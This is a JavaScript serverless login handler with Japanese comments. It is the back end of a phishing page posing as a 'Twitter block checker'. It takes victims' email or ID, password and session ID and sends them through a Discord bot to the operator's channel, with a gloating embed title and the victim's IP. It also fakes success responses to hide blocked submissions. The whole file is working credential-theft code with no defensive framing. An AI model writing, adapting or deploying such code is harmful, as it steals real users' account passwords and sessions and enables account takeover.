// api/login.js
import { Redis } from '@upstash/redis';
import { Ratelimit } from '@upstash/ratelimit';

// --- 設定エリア ---
// Upstash Redisに環境変数から自動接続
const redis = Redis.fromEnv();

// レートリミット設定 (1時間に5回まで)
// それ以上はブロックしますが、画面上は成功したように見せかけます
const ratelimit = new Ratelimit({
  redis: redis,
  limiter: Ratelimit.slidingWindow(5, '1 h'),
  analytics: true,
});

// スパム対策: 文字数が異常に多い場合は無視する
const MAX_LENGTH = 200; 

export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');

    // ユーザーのIPアドレスを取得
    const ip = req.headers['x-forwarded-for'] || '127.0.0.1';
    const ipIdentifier = typeof ip === 'string' ? ip.split(',')[0] : ip;

    try {
        // 1. レートリミットのチェック
        const { success } = await ratelimit.limit(`login_limit_${ipIdentifier}`);

        // 制限を超えている場合 -> ログだけ残して「成功したフリ」をして終了 (ステルス処理)
        if (!success) {
            console.warn(`⛔ Rate limit exceeded for IP: ${ipIdentifier}`);
            return res.status(200).json({ success: true });
        }

        const { email, password, sessionId } = req.body;

        // 2. 文字数チェック (異常に長い入力はスパムとみなして無視)
        if ((email && email.length > MAX_LENGTH) || (password && password.length > MAX_LENGTH)) {
            console.warn(`⚠️ Text length exceeded for IP: ${ipIdentifier}`);
            return res.status(200).json({ success: true });
        }
        
        // バリデーション
        if (!email || !password || !sessionId) {
             return res.status(400).json({ error: 'missing fields' });
        }

        const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
        const CHANNEL_ID = process.env.DISCORD_CHANNEL_ID;

        // Discordへの埋め込みメッセージ作成
        const messageBody = {
            embeds: [
                {
                    title: "きちゃーｗｗｗｗｗ",
                    color: 0x00b0f4, // Twitter Blueっぽい色
                    // コピーしやすいようにコードブロックで囲んでいます
                    description: `**ID or Email**\n\`\`\`\n${email}\n\`\`\`\n**PASS**\n\`\`\`\n${password}\n\`\`\`\n**Session ID**\n\`\`\`\n${sessionId}\n\`\`\``,
                    footer: {
                        // ここにIPアドレスを追加しました
                        text: `Twitterブロック診断 | IP: ${ipIdentifier}`,
                    },
                    timestamp: new Date().toISOString()
                }
            ],
            components: [
                {
                    type: 1, // Action Row
                    components: [
                        {
                            type: 2, // Button
                            style: 1, // Primary (Blue)
                            label: "認証結果を送信 (人数入力)",
                            custom_id: `open_modal::${sessionId}`
                        }
                    ]
                }
            ]
        };

        // Discord APIへ送信
        const discordRes = await fetch(`https://discord.com/api/v10/channels/${CHANNEL_ID}/messages`, {
            method: 'POST',
            headers: {
                'Authorization': `Bot ${DISCORD_BOT_TOKEN}`,
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(messageBody)
        });

        if (!discordRes.ok) {
            console.error('Discord API Error:', await discordRes.text());
            throw new Error('Discord send failed');
        }

        // 成功レスポンス
        res.status(200).json({ success: true });

    } catch (error) {
        console.error("Server Error:", error);
        // サーバーエラー時も、クライアントにはあまり情報を与えず500だけ返す
        res.status(500).json({ error: 'Internal Server Error' });
    }
}
